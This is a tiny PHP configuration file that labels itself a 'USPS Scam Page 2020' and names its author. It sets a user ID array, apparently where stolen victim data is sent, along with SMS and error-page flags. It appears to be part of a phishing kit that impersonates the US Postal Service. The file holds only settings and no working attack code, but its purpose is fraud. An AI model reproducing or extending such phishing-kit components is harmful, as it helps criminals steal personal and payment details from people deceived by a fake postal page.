<?php
/* 
USPS Scam Page 2020
CODED BY ARON-TN
*/
$user_ids=array("1305831045");
$sms='1';
$error='1';
?>
